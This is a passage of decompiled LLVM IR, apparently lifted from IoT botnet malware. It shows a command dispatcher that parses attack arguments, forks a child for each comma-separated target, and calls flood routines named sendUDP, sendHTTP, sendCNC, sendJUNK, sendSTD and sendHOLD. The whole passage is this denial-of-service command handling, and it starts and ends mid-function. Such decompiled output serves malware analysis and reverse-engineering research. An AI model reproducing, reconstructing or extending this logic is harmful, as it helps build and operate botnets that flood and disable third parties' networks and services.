dec_label_pc_11fbc:                               ; preds = %dec_label_pc_11f70, %dec_label_pc_11f1c, %dec_label_pc_11e48, %dec_label_pc_11fa4
  %v2_11fc0 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_2806c.1247 to i32), i32* @r1, align 4
  %v3_11fcc = inttoptr i32 %v2_11fc0 to i8*
  %v4_11fcc = call i32 @__GI_strcoll(i8* %v3_11fcc, i32 ptrtoint ([4 x i8]* @global_var_2806c.1247 to i32))
  %v2_11fd4 = icmp eq i32 %v4_11fcc, 0
  br i1 %v2_11fd4, label %dec_label_pc_11fdc, label %dec_label_pc_1226c

dec_label_pc_11fdc:                               ; preds = %dec_label_pc_11fbc
  %v7_11fe4 = icmp slt i32 %arg1, 6
  br i1 %v7_11fe4, label %dec_label_pc_12d7c, label %dec_label_pc_11fe8

dec_label_pc_11fe8:                               ; preds = %dec_label_pc_11fdc
  %v1_11fec = add i32 %tmp, 12
  %v1_11ff0 = inttoptr i32 %v1_11fec to i32*
  %v2_11ff0 = load i32, i32* %v1_11ff0, align 4
  store i32 %v2_11ff0, i32* @r0, align 4
  %v1_11ff8 = call i32 @atol(i32 %v2_11ff0)
  %v7_12000 = icmp eq i32 %v1_11ff8, -1
  br i1 %v7_12000, label %dec_label_pc_12d7c, label %dec_label_pc_12008

dec_label_pc_12008:                               ; preds = %dec_label_pc_11fe8
  %v1_1200c = add i32 %tmp, 8
  %v1_12010 = inttoptr i32 %v1_1200c to i32*
  %v2_12010 = load i32, i32* %v1_12010, align 4
  store i32 %v2_12010, i32* @r0, align 4
  %v1_12018 = call i32 @atol(i32 %v2_12010)
  %v7_12020 = icmp eq i32 %v1_12018, -1
  br i1 %v7_12020, label %dec_label_pc_12d7c, label %dec_label_pc_12028

dec_label_pc_12028:                               ; preds = %dec_label_pc_12008
  %v1_1202c = add i32 %tmp, 16
  %v1_12030 = inttoptr i32 %v1_1202c to i32*
  %v2_12030 = load i32, i32* %v1_12030, align 4
  store i32 %v2_12030, i32* @r0, align 4
  %v1_12038 = call i32 @atol(i32 %v2_12030)
  %v7_12040 = icmp eq i32 %v1_12038, -1
  br i1 %v7_12040, label %dec_label_pc_12d7c, label %dec_label_pc_12048

dec_label_pc_12048:                               ; preds = %dec_label_pc_12028
  %v1_1204c = add i32 %tmp, 20
  %v1_12050 = inttoptr i32 %v1_1204c to i32*
  %v2_12050 = load i32, i32* %v1_12050, align 4
  store i32 %v2_12050, i32* @r0, align 4
  %v1_12058 = call i32 @atol(i32 %v2_12050)
  %v7_12060 = icmp eq i32 %v1_12058, -1
  br i1 %v7_12060, label %dec_label_pc_12d7c, label %dec_label_pc_12068

dec_label_pc_12068:                               ; preds = %dec_label_pc_12048
  %v2_12070 = load i32, i32* %v1_12050, align 4
  store i32 %v2_12070, i32* @r0, align 4
  %v1_12078 = call i32 @atol(i32 %v2_12070)
  %v8_1208c = icmp sgt i32 %v1_12078, ptrtoint (i32* @global_var_ffdc.1071 to i32)
  br i1 %v8_1208c, label %dec_label_pc_12d7c, label %dec_label_pc_12090

dec_label_pc_12090:                               ; preds = %dec_label_pc_12068
  %v2_12098 = load i32, i32* %v1_12030, align 4
  store i32 %v2_12098, i32* @r0, align 4
  %v1_120a0 = call i32 @atol(i32 %v2_12098)
  %v8_120ac = icmp sgt i32 %v1_120a0, 32
  br i1 %v8_120ac, label %dec_label_pc_12d7c, label %dec_label_pc_120b0

dec_label_pc_120b0:                               ; preds = %dec_label_pc_12090
  %v7_120b4 = icmp eq i32 %arg1, 7
  br i1 %v7_120b4, label %dec_label_pc_120bc, label %dec_label_pc_120e0

dec_label_pc_120bc:                               ; preds = %dec_label_pc_120b0
  %v1_120c0 = add i32 %tmp, 24
  %v1_120c4 = inttoptr i32 %v1_120c0 to i32*
  %v2_120c4 = load i32, i32* %v1_120c4, align 4
  store i32 %v2_120c4, i32* @r0, align 4
  %v1_120cc = call i32 @atol(i32 %v2_120c4)
  %v5_120d8 = icmp sgt i32 %v1_120cc, 0
  br i1 %v5_120d8, label %dec_label_pc_120e0, label %dec_label_pc_12d7c

dec_label_pc_120e0:                               ; preds = %dec_label_pc_120b0, %dec_label_pc_120bc
  %v1_120e4 = add i32 %tmp, 4
  %v1_120e8 = inttoptr i32 %v1_120e4 to i32*
  %v2_120e8 = load i32, i32* %v1_120e8, align 4
  %v2_120f8 = load i32, i32* %v1_12010, align 4
  store i32 %v2_120f8, i32* @r0, align 4
  %v1_12100 = call i32 @atol(i32 %v2_120f8)
  %v2_12114 = load i32, i32* %v1_11ff0, align 4
  store i32 %v2_12114, i32* @r0, align 4
  %v1_1211c = call i32 @atol(i32 %v2_12114)
  %v2_12130 = load i32, i32* %v1_12030, align 4
  store i32 %v2_12130, i32* @r0, align 4
  %v1_12138 = call i32 @atol(i32 %v2_12130)
  %v2_1214c = load i32, i32* %v1_12050, align 4
  store i32 %v2_1214c, i32* @r0, align 4
  %v1_12154 = call i32 @atol(i32 %v2_1214c)
  br i1 %v7_120b4, label %dec_label_pc_1216c, label %dec_label_pc_12188

dec_label_pc_1216c:                               ; preds = %dec_label_pc_120e0
  %v1_12170 = add i32 %tmp, 24
  %v1_12174 = inttoptr i32 %v1_12170 to i32*
  %v2_12174 = load i32, i32* %v1_12174, align 4
  store i32 %v2_12174, i32* @r0, align 4
  %v1_1217c = call i32 @atol(i32 %v2_12174)
  br label %dec_label_pc_12190

dec_label_pc_12188:                               ; preds = %dec_label_pc_120e0
  br label %dec_label_pc_12190

dec_label_pc_12190:                               ; preds = %dec_label_pc_1216c, %dec_label_pc_12188
  %storemerge9 = phi i32 [ 10, %dec_label_pc_12188 ], [ %v1_1217c, %dec_label_pc_1216c ]
  store i32 %v2_120e8, i32* @r0, align 4
  %v2_121a4 = call i32 @__GI_strchr(i32 %v2_120e8, i32 44)
  %v2_121ac = icmp eq i32 %v2_121a4, 0
  br i1 %v2_121ac, label %dec_label_pc_12230, label %dec_label_pc_121b4

dec_label_pc_121b4:                               ; preds = %dec_label_pc_12190
  %v2_121c0 = call i32 @__GI_strtok(i32 %v2_120e8, i32 ptrtoint (i32* @global_var_27f94.1195 to i32))
  %v2_1222444 = icmp eq i32 %v2_121c0, 0
  br i1 %v2_1222444, label %dec_label_pc_1226c, label %dec_label_pc_121d0

dec_label_pc_121d0:                               ; preds = %dec_label_pc_121b4, %dec_label_pc_1220c
  %storemerge2445 = phi i32 [ %v2_12214, %dec_label_pc_1220c ], [ %v2_121c0, %dec_label_pc_121b4 ]
  %v0_121d0 = call i32 @listFork()
  %v2_121d8 = icmp eq i32 %v0_121d0, 0
  br i1 %v2_121d8, label %dec_label_pc_121e0, label %dec_label_pc_1220c

dec_label_pc_121e0:                               ; preds = %dec_label_pc_121d0
  %v6_12200 = call i32 @sendUDP(i32 %storemerge2445, i32 %v1_12100, i32 %v1_1211c, i32 %v1_12138, i32 %v1_12154, i32 %storemerge9)
  %v1_12208 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1220c

dec_label_pc_1220c:                               ; preds = %dec_label_pc_121d0, %dec_label_pc_121e0
  %v2_12214 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_27f94.1195 to i32))
  %v2_12224 = icmp eq i32 %v2_12214, 0
  br i1 %v2_12224, label %dec_label_pc_1226c, label %dec_label_pc_121d0

dec_label_pc_12230:                               ; preds = %dec_label_pc_12190
  %v0_12230 = call i32 @listFork()
  %v2_12238 = icmp eq i32 %v0_12230, 0
  br i1 %v2_12238, label %dec_label_pc_12240, label %dec_label_pc_12d7c

dec_label_pc_12240:                               ; preds = %dec_label_pc_12230
  %v6_12260 = call i32 @sendUDP(i32 %v2_120e8, i32 %v1_12100, i32 %v1_1211c, i32 %v1_12138, i32 %v1_12154, i32 %storemerge9)
  %v1_12268 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1226c

dec_label_pc_1226c:                               ; preds = %dec_label_pc_1220c, %dec_label_pc_121b4, %dec_label_pc_11fbc, %dec_label_pc_12240
  %v2_12270 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_28070.1249 to i32), i32* @r1, align 4
  %v3_1227c = inttoptr i32 %v2_12270 to i8*
  %v4_1227c = call i32 @__GI_strcoll(i8* %v3_1227c, i32 ptrtoint ([5 x i8]* @global_var_28070.1249 to i32))
  %v2_12284 = icmp eq i32 %v4_1227c, 0
  br i1 %v2_12284, label %dec_label_pc_1228c, label %dec_label_pc_12464

dec_label_pc_1228c:                               ; preds = %dec_label_pc_1226c
  %v7_12294 = icmp slt i32 %arg1, 6
  br i1 %v7_12294, label %dec_label_pc_12d7c, label %dec_label_pc_12298

dec_label_pc_12298:                               ; preds = %dec_label_pc_1228c
  %v1_1229c = add i32 %tmp, 4
  %v1_122a0 = inttoptr i32 %v1_1229c to i32*
  %v2_122a0 = load i32, i32* %v1_122a0, align 4
  store i32 %v2_122a0, i32* @r0, align 4
  %v2_122ac = call i32 @__GI_strchr(i32 %v2_122a0, i32 44)
  %v2_122b4 = icmp eq i32 %v2_122ac, 0
  br i1 %v2_122b4, label %dec_label_pc_123b4, label %dec_label_pc_122bc

dec_label_pc_122bc:                               ; preds = %dec_label_pc_12298
  %v2_122c4 = load i32, i32* %v1_122a0, align 4
  %v2_122d0 = call i32 @__GI_strtok(i32 %v2_122c4, i32 ptrtoint (i32* @global_var_27f94.1195 to i32))
  %v2_123a842 = icmp eq i32 %v2_122d0, 0
  br i1 %v2_123a842, label %dec_label_pc_12464, label %dec_label_pc_122e0.lr.ph

dec_label_pc_122e0.lr.ph:                         ; preds = %dec_label_pc_122bc
  %v1_12300 = add i32 %tmp, 8
  %v1_12304 = inttoptr i32 %v1_12300 to i32*
  %v1_12310 = add i32 %tmp, 12
  %v1_12314 = inttoptr i32 %v1_12310 to i32*
  %v1_12330 = add i32 %tmp, 16
  %v1_12334 = inttoptr i32 %v1_12330 to i32*
  %v1_12340 = add i32 %tmp, 20
  %v1_12344 = inttoptr i32 %v1_12340 to i32*
  %v1_12358 = add i32 %tmp, 24
  %v1_1235c = inttoptr i32 %v1_12358 to i32*
  br label %dec_label_pc_122e0

dec_label_pc_122e0:                               ; preds = %dec_label_pc_122e0.lr.ph, %dec_label_pc_12390
  %v0_122e0 = call i32 @listFork()
  %v2_122e8 = icmp eq i32 %v0_122e0, 0
  br i1 %v2_122e8, label %dec_label_pc_122f0, label %dec_label_pc_12390

dec_label_pc_122f0:                               ; preds = %dec_label_pc_122e0
  %v2_122f8 = load i32, i32* %v1_122a0, align 4
  store i32 %v2_122f8, i32* @r5, align 4
  %v2_12304 = load i32, i32* %v1_12304, align 4
  store i32 %v2_12304, i32* @r6, align 4
  %v2_12314 = load i32, i32* %v1_12314, align 4
  store i32 %v2_12314, i32* @r0, align 4
  %v1_1231c = call i32 @atol(i32 %v2_12314)
  %v3_12328 = urem i32 %v1_1231c, 65536
  store i32 %v3_12328, i32* @r7, align 4
  %v2_12334 = load i32, i32* %v1_12334, align 4
  store i32 %v2_12334, i32* @r8, align 4
  %v2_12344 = load i32, i32* %v1_12344, align 4
  store i32 %v2_12344, i32* @r0, align 4
  %v1_1234c = call i32 @atol(i32 %v2_12344)
  store i32 %v1_1234c, i32* @r4, align 4
  %v2_1235c = load i32, i32* %v1_1235c, align 4
  store i32 %v2_1235c, i32* @r0, align 4
  %v1_12364 = call i32 @atol(i32 %v2_1235c)
  %v0_1236c = load i32, i32* @r4, align 4
  %v0_12374 = load i32, i32* @r5, align 4
  %v0_12378 = load i32, i32* @r6, align 4
  %v0_1237c = load i32, i32* @r7, align 4
  %v0_12380 = load i32, i32* @r8, align 4
  %v6_12384 = trunc i32 %v0_1237c to i16
  %v7_12384 = call i32 @sendHTTP(i32 %v0_12374, i32 %v0_12378, i16 %v6_12384, i32 %v0_12380, i32 %v0_1236c, i32 %v1_12364)
  %v1_1238c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_12390

dec_label_pc_12390:                               ; preds = %dec_label_pc_122e0, %dec_label_pc_122f0
  %v2_12398 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_27f94.1195 to i32))
  %v2_123a8 = icmp eq i32 %v2_12398, 0
  br i1 %v2_123a8, label %dec_label_pc_12464, label %dec_label_pc_122e0

dec_label_pc_123b4:                               ; preds = %dec_label_pc_12298
  %v0_123b4 = call i32 @listFork()
  %v2_123bc = icmp eq i32 %v0_123b4, 0
  br i1 %v2_123bc, label %dec_label_pc_123c4, label %dec_label_pc_12d7c

dec_label_pc_123c4:                               ; preds = %dec_label_pc_123b4
  %v2_123cc = load i32, i32* %v1_122a0, align 4
  store i32 %v2_123cc, i32* @r5, align 4
  %v1_123d4 = add i32 %tmp, 8
  %v1_123d8 = inttoptr i32 %v1_123d4 to i32*
  %v2_123d8 = load i32, i32* %v1_123d8, align 4
  store i32 %v2_123d8, i32* @r6, align 4
  %v1_123e4 = add i32 %tmp, 12
  %v1_123e8 = inttoptr i32 %v1_123e4 to i32*
  %v2_123e8 = load i32, i32* %v1_123e8, align 4
  store i32 %v2_123e8, i32* @r0, align 4
  %v1_123f0 = call i32 @atol(i32 %v2_123e8)
  %v3_123fc = urem i32 %v1_123f0, 65536
  store i32 %v3_123fc, i32* @r7, align 4
  %v1_12404 = add i32 %tmp, 16
  %v1_12408 = inttoptr i32 %v1_12404 to i32*
  %v2_12408 = load i32, i32* %v1_12408, align 4
  store i32 %v2_12408, i32* @r8, align 4
  %v1_12414 = add i32 %tmp, 20
  %v1_12418 = inttoptr i32 %v1_12414 to i32*
  %v2_12418 = load i32, i32* %v1_12418, align 4
  store i32 %v2_12418, i32* @r0, align 4
  %v1_12420 = call i32 @atol(i32 %v2_12418)
  store i32 %v1_12420, i32* @r4, align 4
  %v1_1242c = add i32 %tmp, 24
  %v1_12430 = inttoptr i32 %v1_1242c to i32*
  %v2_12430 = load i32, i32* %v1_12430, align 4
  store i32 %v2_12430, i32* @r0, align 4
  %v1_12438 = call i32 @atol(i32 %v2_12430)
  %v0_12440 = load i32, i32* @r4, align 4
  %v0_12448 = load i32, i32* @r5, align 4
  %v0_1244c = load i32, i32* @r6, align 4
  %v0_12450 = load i32, i32* @r7, align 4
  %v0_12454 = load i32, i32* @r8, align 4
  %v6_12458 = trunc i32 %v0_12450 to i16
  %v7_12458 = call i32 @sendHTTP(i32 %v0_12448, i32 %v0_1244c, i16 %v6_12458, i32 %v0_12454, i32 %v0_12440, i32 %v1_12438)
  %v1_12460 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_12464

dec_label_pc_12464:                               ; preds = %dec_label_pc_12390, %dec_label_pc_122bc, %dec_label_pc_1226c, %dec_label_pc_123c4
  %v2_12468 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_28078.1251 to i32), i32* @r1, align 4
  %v3_12474 = inttoptr i32 %v2_12468 to i8*
  %v4_12474 = call i32 @__GI_strcoll(i8* %v3_12474, i32 ptrtoint ([4 x i8]* @global_var_28078.1251 to i32))
  %v2_1247c = icmp eq i32 %v4_12474, 0
  br i1 %v2_1247c, label %dec_label_pc_12484, label %dec_label_pc_125d8

dec_label_pc_12484:                               ; preds = %dec_label_pc_12464
  %v7_1248c = icmp slt i32 %arg1, 4
  br i1 %v7_1248c, label %dec_label_pc_12d7c, label %dec_label_pc_12490

dec_label_pc_12490:                               ; preds = %dec_label_pc_12484
  %v1_12494 = add i32 %tmp, 8
  %v1_12498 = inttoptr i32 %v1_12494 to i32*
  %v2_12498 = load i32, i32* %v1_12498, align 4
  store i32 %v2_12498, i32* @r0, align 4
  %v1_124a0 = call i32 @atol(i32 %v2_12498)
  %tmp116 = icmp slt i32 %v1_124a0, 1
  br i1 %tmp116, label %dec_label_pc_12d7c, label %dec_label_pc_124b0

dec_label_pc_124b0:                               ; preds = %dec_label_pc_12490
  %v1_124b4 = add i32 %tmp, 12
  %v1_124b8 = inttoptr i32 %v1_124b4 to i32*
  %v2_124b8 = load i32, i32* %v1_124b8, align 4
  store i32 %v2_124b8, i32* @r0, align 4
  %v1_124c0 = call i32 @atol(i32 %v2_124b8)
  %v5_124cc = icmp sgt i32 %v1_124c0, 0
  br i1 %v5_124cc, label %dec_label_pc_124d4, label %dec_label_pc_12d7c

dec_label_pc_124d4:                               ; preds = %dec_label_pc_124b0
  %v1_124d8 = add i32 %tmp, 4
  %v1_124dc = inttoptr i32 %v1_124d8 to i32*
  %v2_124dc = load i32, i32* %v1_124dc, align 4
  %v2_124ec = load i32, i32* %v1_12498, align 4
  store i32 %v2_124ec, i32* @r0, align 4
  %v1_124f4 = call i32 @atol(i32 %v2_124ec)
  %v2_12508 = load i32, i32* %v1_124b8, align 4
  store i32 %v2_12508, i32* @r0, align 4
  %v1_12510 = call i32 @atol(i32 %v2_12508)
  store i32 %v2_124dc, i32* @r0, align 4
  %v2_12528 = call i32 @__GI_strchr(i32 %v2_124dc, i32 44)
  %v2_12530 = icmp eq i32 %v2_12528, 0
  br i1 %v2_12530, label %dec_label_pc_125b0, label %dec_label_pc_12538

dec_label_pc_12538:                               ; preds = %dec_label_pc_124d4
  %v2_12544 = call i32 @__GI_strtok(i32 %v2_124dc, i32 ptrtoint (i32* @global_var_27f94.1195 to i32))
  %v2_125a439 = icmp eq i32 %v2_12544, 0
  br i1 %v2_125a439, label %dec_label_pc_125d8, label %dec_label_pc_12554

dec_label_pc_12554:                               ; preds = %dec_label_pc_12538, %dec_label_pc_1258c
  %storemerge2040 = phi i32 [ %v2_12594, %dec_label_pc_1258c ], [ %v2_12544, %dec_label_pc_12538 ]
  %v0_12554 = call i32 @listFork()
  %v2_1255c = icmp eq i32 %v0_12554, 0
  br i1 %v2_1255c, label %dec_label_pc_12564, label %dec_label_pc_1258c

dec_label_pc_12564:                               ; preds = %dec_label_pc_12554
  %v4_12570 = call i32 @sendCNC(i32 %storemerge2040, i32 %v1_124f4, i32 %v1_12510, i32 0)
  %v2_12578 = load i32, i32* @global_var_324c8.59, align 4
  %v1_12580 = call i32 @__GI___libc_close(i32 %v2_12578)
  %v1_12588 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1258c

dec_label_pc_1258c:                               ; preds = %dec_label_pc_12554, %dec_label_pc_12564
  %v2_12594 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_27f94.1195 to i32))
  %v2_125a4 = icmp eq i32 %v2_12594, 0
  br i1 %v2_125a4, label %dec_label_pc_125d8, label %dec_label_pc_12554

dec_label_pc_125b0:                               ; preds = %dec_label_pc_124d4
  %v0_125b0 = call i32 @listFork()
  %v2_125b8 = icmp eq i32 %v0_125b0, 0
  br i1 %v2_125b8, label %dec_label_pc_125c0, label %dec_label_pc_12d7c

dec_label_pc_125c0:                               ; preds = %dec_label_pc_125b0
  %v4_125cc = call i32 @sendCNC(i32 %v2_124dc, i32 %v1_124f4, i32 %v1_12510, i32 0)
  %v1_125d4 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_125d8

dec_label_pc_125d8:                               ; preds = %dec_label_pc_1258c, %dec_label_pc_12538, %dec_label_pc_12464, %dec_label_pc_125c0
  %v2_125dc = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_2807c.1253 to i32), i32* @r1, align 4
  %v3_125e8 = inttoptr i32 %v2_125dc to i8*
  %v4_125e8 = call i32 @__GI_strcoll(i8* %v3_125e8, i32 ptrtoint ([6 x i8]* @global_var_2807c.1253 to i32))
  %v2_125f0 = icmp eq i32 %v4_125e8, 0
  br i1 %v2_125f0, label %dec_label_pc_125f8, label %dec_label_pc_1278c

dec_label_pc_125f8:                               ; preds = %dec_label_pc_125d8
  %v7_12600 = icmp slt i32 %arg1, 4
  br i1 %v7_12600, label %dec_label_pc_12d7c, label %dec_label_pc_12604

dec_label_pc_12604:                               ; preds = %dec_label_pc_125f8
  %v1_12608 = add i32 %tmp, 8
  %v1_1260c = inttoptr i32 %v1_12608 to i32*
  %v2_1260c = load i32, i32* %v1_1260c, align 4
  store i32 %v2_1260c, i32* @r0, align 4
  %v1_12614 = call i32 @atol(i32 %v2_1260c)
  %tmp117 = icmp slt i32 %v1_12614, 1
  br i1 %tmp117, label %dec_label_pc_12d7c, label %dec_label_pc_12624

dec_label_pc_12624:                               ; preds = %dec_label_pc_12604
  %v1_12628 = add i32 %tmp, 12
  %v1_1262c = inttoptr i32 %v1_12628 to i32*
  %v2_1262c = load i32, i32* %v1_1262c, align 4
  store i32 %v2_1262c, i32* @r0, align 4
  %v1_12634 = call i32 @atol(i32 %v2_1262c)
  %v5_12640 = icmp sgt i32 %v1_12634, 0
  br i1 %v5_12640, label %dec_label_pc_12648, label %dec_label_pc_12d7c

dec_label_pc_12648:                               ; preds = %dec_label_pc_12624
  %v1_1264c = add i32 %tmp, 4
  %v1_12650 = inttoptr i32 %v1_1264c to i32*
  %v2_12650 = load i32, i32* %v1_12650, align 4
  %v2_12660 = load i32, i32* %v1_1260c, align 4
  store i32 %v2_12660, i32* @r0, align 4
  %v1_12668 = call i32 @atol(i32 %v2_12660)
  %v2_1267c = load i32, i32* %v1_1262c, align 4
  store i32 %v2_1267c, i32* @r0, align 4
  %v1_12684 = call i32 @atol(i32 %v2_1267c)
  store i32 %v2_12650, i32* @r0, align 4
  %v2_1269c = call i32 @__GI_strchr(i32 %v2_12650, i32 44)
  %v2_126a4 = icmp eq i32 %v2_1269c, 0
  br i1 %v2_126a4, label %dec_label_pc_12744, label %dec_label_pc_126ac

dec_label_pc_126ac:                               ; preds = %dec_label_pc_12648
  %v2_126b8 = call i32 @__GI_strtok(i32 %v2_12650, i32 ptrtoint (i32* @global_var_27f94.1195 to i32))
  %v2_1273836 = icmp eq i32 %v2_126b8, 0
  br i1 %v2_1273836, label %dec_label_pc_1278c, label %dec_label_pc_126c8

dec_label_pc_126c8:                               ; preds = %dec_label_pc_126ac, %dec_label_pc_12720
  %storemerge1837 = phi i32 [ %v2_12728, %dec_label_pc_12720 ], [ %v2_126b8, %dec_label_pc_126ac ]
  %v0_126c8 = call i32 @listFork()
  %v2_126d0 = icmp eq i32 %v0_126c8, 0
  br i1 %v2_126d0, label %dec_label_pc_126d8, label %dec_label_pc_12720

dec_label_pc_126d8:                               ; preds = %dec_label_pc_126c8
  %v4_126e4 = call i32 @sendJUNK(i32 %storemerge1837, i32 %v1_12668, i32 %v1_12684, i32 0)
  %v3_126f4 = call i32 @sendSTD(i32 %storemerge1837, i32 %v1_12668, i32 %v1_12684)
  %v3_12704 = call i32 @sendHOLD(i32 %storemerge1837, i32 %v1_12668, i32 %v1_12684)
  %v2_1270c = load i32, i32* @global_var_324c8.59, align 4
  %v1_12714 = call i32 @__GI___libc_close(i32 %v2_1270c)
  %v1_1271c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_12720

dec_label_pc_12720:                               ; preds = %dec_label_pc_126c8, %dec_label_pc_126d8
  %v2_12728 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_27f94.1195 to i32))
  %v2_12738 = icmp eq i32 %v2_12728, 0
  br i1 %v2_12738, label %dec_label_pc_1278c, label %dec_label_pc_126c8

dec_label_pc_12744:                               ; preds = %dec_label_pc_12648
  %v0_12744 = call i32 @listFork()
  %v2_1274c = icmp eq i32 %v0_12744, 0
  br i1 %v2_1274c, label %dec_label_pc_12754, label %dec_label_pc_12d7c

dec_label_pc_12754:                               ; preds = %dec_label_pc_12744
  %v4_12760 = call i32 @sendJUNK(i32 %v2_12650, i32 %v1_12668, i32 %v1_12684, i32 0)
  %v3_12770 = call i32 @sendSTD(i32 %v2_12650, i32 %v1_12668, i32 %v1_12684)
  %v3_12780 = call i32 @sendHOLD(i32 %v2_12650, i32 %v1_12668, i32 %v1_12684)
  %v1_12788 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1278c

dec_label_pc_1278c:                               ; preds = %dec_label_pc_12720, %dec_label_pc_126ac, %dec_label_pc_125d8, %dec_label_pc_12754
  %v2_12790 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_28084.1255 to i32), i32* @r1, align 4
  %v3_1279c = inttoptr i32 %v2_12790 to i8*
  %v4_1279c = call i32 @__GI_strcoll(i8* %v3_1279c, i32 ptrtoint ([4 x i8]* @global_var_28084.1255 to i32))
  %v2_127a4 = icmp eq i32 %v4_1279c, 0
  br i1 %v2_127a4, label %dec_label_pc_127ac, label %dec_label_pc_128f0

dec_label_pc_127ac:                               ; preds = %dec_label_pc_1278c
  %v7_127b4 = icmp slt i32 %arg1, 4
  br i1 %v7_127b4, label %dec_label_pc_12d7c, label %dec_label_pc_127b8

dec_label_pc_127b8:                               ; preds = %dec_label_pc_127ac
  %v1_127bc = add i32 %tmp, 8
  %v1_127c0 = inttoptr i32 %v1_127bc to i32*
  %v2_127c0 = load i32, i32* %v1_127c0, align 4
  store i32 %v2_127c0, i32* @r0, align 4
  %v1_127c8 = call i32 @atol(i32 %v2_127c0)
  %tmp118 = icmp slt i32 %v1_127c8, 1
  br i1 %tmp118, label %dec_label_pc_12d7c, label %dec_label_pc_127d8

dec_label_pc_127d8:                               ; preds = %dec_label_pc_127b8
  %v1_127dc = add i32 %tmp, 12
  %v1_127e0 = inttoptr i32 %v1_127dc to i32*
  %v2_127e0 = load i32, i32* %v1_127e0, align 4
  store i32 %v2_127e0, i32* @r0, align 4
  %v1_127e8 = call i32 @atol(i32 %v2_127e0)
  %v5_127f4 = icmp sgt i32 %v1_127e8, 0
  br i1 %v5_127f4, label %dec_label_pc_127fc, label %dec_label_pc_12d7c

dec_label_pc_127fc:                               ; preds = %dec_label_pc_127d8
  %v1_12800 = add i32 %tmp, 4
  %v1_12804 = inttoptr i32 %v1_12800 to i32*
  %v2_12804 = load i32, i32* %v1_12804, align 4
  %v2_12814 = load i32, i32* %v1_127c0, align 4
  store i32 %v2_12814, i32* @r0, align 4
  %v1_1281c = call i32 @atol(i32 %v2_12814)
  %v2_12830 = load i32, i32* %v1_127e0, align 4
  store i32 %v2_12830, i32* @r0, align 4
  %v1_12838 = call i32 @atol(i32 %v2_12830)
  store i32 %v2_12804, i32* @r0, align 4
  %v2_12850 = call i32 @__GI_strchr(i32 %v2_12804, i32 44)
  %v2_12858 = icmp eq i32 %v2_12850, 0
  br i1 %v2_12858, label %dec_label_pc_128c8, label %dec_label_pc_12860

dec_label_pc_12860:                               ; preds = %dec_label_pc_127fc
  %v2_1286c = call i32 @__GI_strtok(i32 %v2_12804, i32 ptrtoint (i32* @global_var_27f94.1195 to i32))
  %v2_128bc33 = icmp eq i32 %v2_1286c, 0
  br i1 %v2_128bc33, label %dec_label_pc_128f0, label %dec_label_pc_1287c

dec_label_pc_1287c:                               ; preds = %dec_label_pc_12860, %dec_label_pc_128a4
  %storemerge1634 = phi i32 [ %v2_128ac, %dec_label_pc_128a4 ], [ %v2_1286c, %dec_label_pc_12860 ]
  %v0_1287c = call i32 @listFork()
  %v2_12884 = icmp eq i32 %v0_1287c, 0
  br i1 %v2_12884, label %dec_label_pc_1288c, label %dec_label_pc_128a4

dec_label_pc_1288c:                               ; preds = %dec_label_pc_1287c
  %v3_12898 = call i32 @sendSTD(i32 %storemerge1634, i32 %v1_1281c, i32 %v1_12838)
  %v1_128a0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_128a4

dec_label_pc_128a4:                               ; preds = %dec_label_pc_1287c, %dec_label_pc_1288c
  %v2_128ac = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_27f94.1195 to i32))
  %v2_128bc = icmp eq i32 %v2_128ac, 0
  br i1 %v2_128bc, label %dec_label_pc_128f0, label %dec_label_pc_1287c

dec_label_pc_128c8:                               ; preds = %dec_label_pc_127fc
  %v0_128c8 = call i32 @listFork()
  %v2_128d0 = icmp eq i32 %v0_128c8, 0
  br i1 %v2_128d0, label %dec_label_pc_128d8, label %dec_label_pc_12d7c

dec_label_pc_128d8:                               ; preds = %dec_label_pc_128c8
  %v3_128e4 = call i32 @sendSTD(i32 %v2_12804, i32 %v1_1281c, i32 %v1_12838)
  %v1_128ec = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_128f0

dec_label_pc_128f0:                               ; preds = %dec_label_pc_128a4, %dec_label_pc_12860, %dec_label_pc_1278c, %dec_label_pc_128d8
  %v2_128f4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_28088.1257 to i32), i32* @r1, align 4
  %v3_12900 = inttoptr i32 %v2_128f4 to i8*
  %v4_12900 = call i32 @__GI_strcoll(i8* %v3_12900, i32 ptrtoint ([4 x i8]* @global_var_28088.1257 to i32))
  %v2_12908 = icmp eq i32 %v4_12900, 0
  br i1 %v2_12908, label %dec_label_pc_12910, label %dec_label_pc_12c3c

dec_label_pc_12910:                               ; preds = %dec_label_pc_128f0
  %v7_12918 = icmp slt i32 %arg1, 6
  br i1 %v7_12918, label %dec_label_pc_12d7c, label %dec_label_pc_1291c

dec_label_pc_1291c:                               ; preds = %dec_label_pc_12910
  %v1_12920 = add i32 %tmp, 12
  %v1_12924 = inttoptr i32 %v1_12920 to i32*
  %v2_12924 = load i32, i32* %v1_12924, align 4
  store i32 %v2_12924, i32* @r0, align 4
  %v1_1292c = call i32 @atol(i32 %v2_12924)
  %v7_12934 = icmp eq i32 %v1_1292c, -1
  br i1 %v7_12934, label %dec_label_pc_12d7c, label %dec_label_pc_1293c

dec_label_pc_1293c:                               ; preds = %dec_label_pc_1291c
  %v1_12940 = add i32 %tmp, 8
  %v1_12944 = inttoptr i32 %v1_12940 to i32*
  %v2_12944 = load i32, i32* %v1_12944, align 4
  store i32 %v2_12944, i32* @r0, align 4
  %v1_1294c = call i32 @atol(i32 %v2_12944)
